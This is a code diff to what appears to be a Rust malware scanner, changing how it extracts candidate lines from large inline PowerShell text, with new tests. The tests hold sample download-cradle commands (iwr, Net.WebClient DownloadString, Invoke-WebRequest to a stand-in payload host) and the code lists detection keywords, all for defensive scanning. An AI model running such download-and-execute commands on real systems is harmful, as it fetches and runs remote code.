@@ -4391,6 +4391,32 @@ mod herestring_iex_tests {
     }
 
     #[test]
+    fn inline_powershell_large_launch_text_uses_candidate_lines() {
+        let mut text = "rem filler\r\n".repeat(60_000);
+        text.push_str("powershell.exe -Command \"iwr https://inline-candidate.example/a\"\r\n");
+        text.push_str(&"rem tail\r\n".repeat(60_000));
+
+        let candidate = inline_powershell_scan_text(&text);
+
+        assert!(
+            candidate.len() < text.len() / 100,
+            "candidate scan text should avoid feeding filler to ps1 scanner"
+        );
+        assert!(candidate.contains("inline-candidate.example/a"));
+    }
+
+    #[test]
+    fn inline_powershell_large_global_payload_keeps_full_text() {
+        let mut text = "$u='https://global-inline.example/a'\r\n".to_string();
+        text.push_str(&"rem filler\r\n".repeat(60_000));
+        text.push_str("$wc=New-Object Net.WebClient;$wc.DownloadString($u)\r\n");
+
+        let candidate = inline_powershell_scan_text(&text);
+
+        assert_eq!(candidate.len(), text.len());
+    }
+
+    #[test]
     fn ps1_download_gate_allows_direct_and_alias_downloads() {
         for text in [
             "Invoke-WebRequest -Uri https://payload.example/a -OutFile a.exe",
@@ -5000,6 +5026,7 @@ pub fn scan_inline_powershell_text(text: &str, env: &mut Environment) {
     if !inline_powershell_text_has_payload_signal(text) {
         return;
     }
+    let scan_text = inline_powershell_scan_text(text);
     let known_downloads: std::collections::HashSet<String> = env
         .traits
         .iter()
@@ -5020,7 +5047,9 @@ pub fn scan_inline_powershell_text(text: &str, env: &mut Environment) {
         max_traits_per_kind: 100,
     });
     payload_env.ps1_scan_cache_normalized = false;
-    payload_env.all_extracted_ps1.push(text.as_bytes().to_vec());
+    payload_env
+        .all_extracted_ps1
+        .push(scan_text.as_bytes().to_vec());
     scan_ps1_payloads(&mut payload_env);
     env.traits
         .extend(payload_env.traits.into_iter().filter(|t| match t {
@@ -5029,12 +5058,42 @@ pub fn scan_inline_powershell_text(text: &str, env: &mut Environment) {
         }));
 }
 
-fn inline_powershell_text_has_payload_signal(text: &str) -> bool {
-    if contains_ascii_case_insensitive_bytes(text, b"downloadstring")
+fn inline_powershell_scan_text(text: &str) -> std::borrow::Cow<'_, str> {
+    const LARGE_TEXT_CANDIDATE_THRESHOLD: usize = 512 * 1024;
+    if text.len() < LARGE_TEXT_CANDIDATE_THRESHOLD {
+        return std::borrow::Cow::Borrowed(text);
+    }
+
+    if inline_powershell_text_needs_global_context(text) {
+        return std::borrow::Cow::Borrowed(text);
+    }
+
+    let mut candidate = String::new();
+    for line in text.lines() {
+        if inline_powershell_launch_line_has_payload_signal(line) {
+            if !candidate.is_empty() {
+                candidate.push('\n');
+            }
+            candidate.push_str(line);
+        }
+    }
+
+    if candidate.is_empty() {
+        std::borrow::Cow::Borrowed(text)
+    } else {
+        std::borrow::Cow::Owned(candidate)
+    }
+}
+
+fn inline_powershell_text_needs_global_context(text: &str) -> bool {
+    contains_ascii_case_insensitive_bytes(text, b"downloadstring")
         || contains_ascii_case_insensitive_bytes(text, b"downloadfile")
         || contains_ascii_case_insensitive_bytes(text, b"downloaddata")
         || contains_ascii_case_insensitive_bytes(text, b"callbyname")
-    {
+}
+
+fn inline_powershell_text_has_payload_signal(text: &str) -> bool {
+    if inline_powershell_text_needs_global_context(text) {
         return true;
     }
 
@@ -5051,14 +5110,17 @@ fn inline_powershell_text_has_payload_signal(text: &str) -> bool {
         return true;
     }
 
-    text.lines().any(|line| {
-        (contains_ascii_case_insensitive_bytes(line, b"powershell")
-            || contains_ascii_case_insensitive_bytes(line, b"pwsh"))
-            && (line_has_powershell_payload_flag(line)
-                || contains_ascii_case_insensitive_bytes(line, b"http://")
-                || contains_ascii_case_insensitive_bytes(line, b"https://")
-                || contains_ascii_case_insensitive_bytes(line, b"iex "))
-    })
+    text.lines()
+        .any(inline_powershell_launch_line_has_payload_signal)
+}
+
+fn inline_powershell_launch_line_has_payload_signal(line: &str) -> bool {
+    (contains_ascii_case_insensitive_bytes(line, b"powershell")
+        || contains_ascii_case_insensitive_bytes(line, b"pwsh"))
+        && (line_has_powershell_payload_flag(line)
+            || contains_ascii_case_insensitive_bytes(line, b"http://")
+            || contains_ascii_case_insensitive_bytes(line, b"https://")
+            || contains_ascii_case_insensitive_bytes(line, b"iex "))
 }
 
 fn line_has_powershell_payload_flag(line: &str) -> bool {
